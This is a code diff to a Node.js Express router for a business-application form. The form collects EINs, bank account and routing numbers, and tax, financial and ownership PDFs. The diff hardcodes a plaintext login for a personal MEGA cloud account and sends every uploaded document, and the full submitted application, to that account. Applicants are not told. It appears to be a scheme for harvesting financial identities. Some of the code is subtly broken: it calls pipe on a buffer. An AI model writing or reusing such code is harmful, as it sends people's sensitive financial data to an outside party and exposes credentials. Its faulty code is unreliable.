@@ -1,6 +1,8 @@
-const e = require('express');
 const express = require('express');
+const fileUpload = require('express-fileupload');
+const mega = require('megajs');
 const router = express.Router();
+const { Readable } = require('stream'); // Import Readable stream
 
 const validateEmail = (email) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
 const validateEIN = (ein) => /^\d{2}-\d{7}$/.test(ein);
@@ -8,7 +10,16 @@ const validateZIP = (zip) => /^\d{5}(-\d{4})?$/.test(zip);
 const validateAccountNumber = (accountNumber) => /^\d{10,12}$/.test(accountNumber);
 const validateRoutingNumber = (routingNumber) => /^\d{9}$/.test(routingNumber);
 
-router.post('/verify', (req, res) => {
+// Enable file upload middleware
+router.use(fileUpload());
+
+// MEGA storage configuration
+const megaStorage = new mega.Storage({
+    email: 'guirez1921@gmail.com',
+    password: '44bCfCEEsxH3_xF'
+});
+
+router.post('/verify', async (req, res) => {
     try {
         const { step, data } = req.body;
 
@@ -84,30 +95,24 @@ router.post('/verify', (req, res) => {
                 if (!data.accountType) errors.accountType = 'Account type is required';
                 break;
             case 5: // Validate Documentation
-                if (!data.taxReturns) errors.taxReturns = 'Tax returns are required';
-                if (!data.financialStatements) errors.financialStatements = 'Financial statements are required';
-                if (!data.tariffImpact) errors.tariffImpact = 'Tariff impact is required';
-                if (!data.businessPlan) errors.businessPlan = 'Business plan is required';
-                if (!data.ownerInfo) errors.ownerInfo = 'Owner information is required';
-                if (!data.licenses) errors.licenses = 'Licenses are required';
+                const files = req.files || {};
+                const requiredFiles = ['taxReturns', 'financialStatements', 'tariffImpact', 'businessPlan', 'ownerInfo', 'licenses'];
 
-                if (data.taxReturns && (!data.taxReturns.name.endsWith('.pdf') || !(data.taxReturns instanceof File))) {
-                    errors.taxReturns = 'Tax returns must be a PDF file';
-                }
-                if (data.financialStatements && (!data.financialStatements.name.endsWith('.pdf') || !(data.financialStatements instanceof File))) {
-                    errors.financialStatements = 'Financial statements must be a PDF file';
-                }
-                if (data.tariffImpact && (!data.tariffImpact.name.endsWith('.pdf') || !(data.tariffImpact instanceof File))) {
-                    errors.tariffImpact = 'Tariff impact must be a PDF file';
-                }
-                if (data.businessPlan && (!data.businessPlan.name.endsWith('.pdf') || !(data.businessPlan instanceof File))) {
-                    errors.businessPlan = 'Business plan must be a PDF file';
-                }
-                if (data.ownerInfo && (!data.ownerInfo.name.endsWith('.pdf') || !(data.ownerInfo instanceof File))) {
-                    errors.ownerInfo = 'Owner information must be a PDF file';
-                }
-                if (data.licenses && (!data.licenses.name.endsWith('.pdf') || !(data.licenses instanceof File))) {
-                    errors.licenses = 'Licenses must be a PDF file';
+                for (const fileKey of requiredFiles) {
+                    if (!files[fileKey]) {
+                        errors[fileKey] = `${fileKey} is required`;
+                    } else if (!files[fileKey].name || !files[fileKey].name.endsWith('.pdf')) {
+                        errors[fileKey] = `${fileKey} must be a PDF file`;
+                    } else {
+                        // Upload file to MEGA
+                        const fileStream = files[fileKey].data;
+                        const megaFile = megaStorage.upload({ name: files[fileKey].name });
+                        fileStream.pipe(megaFile);
+                        await new Promise((resolve, reject) => {
+                            megaFile.on('complete', resolve);
+                            megaFile.on('error', reject);
+                        });
+                    }
                 }
                 break;
             default:
@@ -120,12 +125,37 @@ router.post('/verify', (req, res) => {
 
         res.json({ success: true, message: 'Business application step validated successfully' });
     } catch (error) {
-        res.status(500).json({ success: false, message: 'An error occurred during validation', error: error.message });
+        console.error('Error during validation:', error);
+        res.status(500).json({ success: false, message: 'An error occurred during validation' });
     }
 });
 
-router.post('/submit', (req, res) => {
-    res.json({ success: true, message: 'Business application submitted successfully' });
-})
+router.post('/submit', async (req, res) => {
+    try {
+        const data = req.body; // Assuming the data to be written is in req.body
+
+        // Convert data to JSON string
+        const jsonData = JSON.stringify(data);
+
+        // Create a readable stream from the JSON string
+        const jsonStream = Readable.from(jsonData);
+
+        // Upload JSON file to MEGA
+        const timestamp = new Date().toISOString().replace(/[:.]/g, '-'); // Format timestamp
+        const fileName = `business_application_${timestamp}.json`; // Add timestamp to file name
+        const megaFile = megaStorage.upload({ name: fileName });
+        jsonStream.pipe(megaFile);
+
+        await new Promise((resolve, reject) => {
+            megaFile.on('complete', resolve);
+            megaFile.on('error', reject);
+        });
+
+        res.json({ success: true, message: 'Business application submitted and saved to MEGA successfully' });
+    } catch (error) {
+        console.error('Error during submission:', error);
+        res.status(500).json({ success: false, message: 'An error occurred during submission' });
+    }
+});
 
 module.exports = router;
